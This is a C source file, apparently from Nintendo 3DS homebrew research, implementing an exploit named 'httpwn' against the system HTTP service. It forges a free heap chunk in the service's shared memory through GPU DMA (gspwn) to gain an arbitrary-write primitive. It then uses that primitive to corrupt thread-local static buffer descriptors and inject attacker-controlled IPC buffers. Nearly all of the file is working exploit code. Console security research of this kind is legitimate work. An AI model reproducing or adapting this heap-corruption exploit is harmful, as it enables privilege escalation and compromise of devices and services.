#include "httpwn.h"
#include "lib/srv.h"
#include "lib/httpc.h"
#include "lib/gsp.h"
#include "lib/csvc.h"

#define MAGIC_USED_CHUNK        0x5544 // "UD" (used)
#define MAGIC_FREE_CHUNK        0x4652 // "FR" (free)
#define IS_N3DS                 (*(vu32 *)0x1FF80030 >= 6) // APPMEMTYPE. Hacky but doesn't use APT

typedef struct HeapChunk {
    u16 magic;
    u16 leftNeighborOffset;
    u32 size;
    struct HeapChunk *chainPrev;
    struct HeapChunk *chainNext;
    u8 data[];
} HeapChunk;

static u32 guessHeapCurrentEndPa(void *linearAddr)
{
    // ASSUMPTION: we're an application
    // ASSUMPTION: only one linear memory block has been allocated for the application
    // if we fail here, we'll crash badly anyway

    // Linear heap grows upwards from the start of the memregion
    // Everything else grows downwards from the end of the memregion.
    // PM lies about APPMEMALLOC
    u32 appMemType = *(vu32 *)0x1FF80030;
    appMemType = appMemType > 7 ? 7 : appMemType;

    // appMemType 1 doesn't exist
    static const u8 appRegionSizesMb[] = { 64, 64, 96, 80, 72, 32, 124, 178 };
    u32 memRegionEnd = 0x20000000 + (appRegionSizesMb[appMemType] << 20);

    // Figure out how much linear memory has been allocated
    MemInfo info = {0};
    PageInfo pgInfo;
    svcQueryMemory(&info, &pgInfo, (u32)linearAddr);

    // Figure out how memory in total (including code, etc.) has been allocated
    s64 usedMemory = 0;
    svcGetSystemInfo(&usedMemory, 0, 1);

    return memRegionEnd - (usedMemory - (u32)info.size);
}

static Result doHttpwnArbwrite(u32 a, u32 b, u32 sharedMemPa, Handle srvHandle, Handle gspHandle, Handle httpServerHandle, void *linearWorkbuf)
{
    Result res = 0;

    httpcContext ctx;
    TRY(httpcOpenContext(srvHandle, httpServerHandle, &ctx, HTTPC_METHOD_POST, "http://localhost/"));
    TRY(httpcAddPostDataAscii(&ctx, "form_name", "form_value"));

    // Apparently, with the proxy not being configured, our data is at +0 in the sharedmem and there's only 1 allocated heap chunk
    // You'll need to adapt the offsets if you set the default proxy.

    // Read sharedmem. Use size trick to clean-invalidate the entire dcache+l2c by set/way
    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x700000));
    TRY(gspwn(gspHandle, convertLinearMemToPhys(linearWorkbuf), sharedMemPa, 0x1000));
    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));

    // Neighbour/second/last chunk is at +0x3C
    // We end up here: https://gist.github.com/TuxSH/854b2ba84bd7980be598c3d076dc1fcb#file-ctr-heap-c-L44
    // Primitive is: *(a + 12) = b; *(b + 8) = a; (assuming a != 0 and b != 0, in which case the nullptr isn't written to)

    HeapChunk victimChunk = {
        .magic = MAGIC_FREE_CHUNK,
        .leftNeighborOffset = 0,
        .size = 0xFB4,
        .chainPrev = (HeapChunk *)a,
        .chainNext = (HeapChunk *)b,
    };
    memcpy((u8 *)linearWorkbuf + 0x3C, &victimChunk, 0x10);

    // Write sharedmem. Use size trick to clean-invalidate the entire dcache+l2c by set/way
    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));
    TRY(gspwn(gspHandle, sharedMemPa, convertLinearMemToPhys(linearWorkbuf), 0x1000));
    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x700000));

    // Trigger exploit
    TRY(httpcCloseContext(httpServerHandle, &ctx));
    svcSleepThread(25 * 1000 * 1000LL);

    return res;
}

static u32 guessTargetTlsBase(void)
{
    // 4.0(?)-latest
    // We only use this exploit for > 9.2, though
    s64 numKips = 0;
    svcGetSystemInfo(&numKips, 26, 0);

    // Account a 0x2000 offset for non-rosalina, 0x1000 more for N3DS stuff
    return 0x1FFA0000 + (numKips < 6 ? 0x2000 : 0) + (IS_N3DS ? 0x1000 : 0);
}

Result httpwn(Handle *outHandle, u32 baseSbufId, void *linearWorkbuf, const u32 *sbufs, u32 numSbufs, Handle gspHandle)
{
    // hole must be in the middle of a LINEAR heap block

    Result res = 0;
    Handle httpServerHandle;
    Handle srvHandle;

    TRY(srvInit(&srvHandle));

    // Allocate the memory backing the shared memory block -- we know its PA
    u32 tmp2 = 0x12000000;
    Handle sharedMemHandle;
    TRY(svcControlMemory(&tmp2, tmp2, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE));

    u32 sharedMemPa = guessHeapCurrentEndPa(linearWorkbuf);
    TRY(httpcInit(srvHandle, &httpServerHandle, &sharedMemHandle, (void *)tmp2, 0x1000));

    // Primitive is: *(a + 12) = b; *(b + 8) = a;
    // Write the static buffer descriptor (using an unaligned write) and buffer address.
    u32 selfSbufId = baseSbufId; // needs to be >= 4!
    u32 targetTlsBase = guessTargetTlsBase();
    u32 targetTlsArea = targetTlsBase + 0x180 + 8 * selfSbufId;
    TRY(doHttpwnArbwrite(targetTlsArea - 12, targetTlsArea + 2, sharedMemPa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf)); // perfectly valid sbuf descriptor btw
    TRY(doHttpwnArbwrite(targetTlsArea + 4 - 12, targetTlsArea, sharedMemPa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf));

    // We now have static buffer #4 covering its descriptor (tls+0x180+0x20), sz=0x40
    // Inject our static buffers
    // This rewrites the static buffer descriptor we're about to use
    u32 *cmdbuf = getThreadCommandBuffer();
    cmdbuf[0] = IPC_MakeHeader(0xDEAD, 0, 2);
    cmdbuf[1] = IPC_Desc_StaticBuffer(8 * numSbufs, selfSbufId);
    cmdbuf[2] = (u32)sbufs;
    TRY(svcSendSyncRequest(httpServerHandle));

    *outHandle = httpServerHandle;

    // Let things leak, we don't really care
    return res;
}
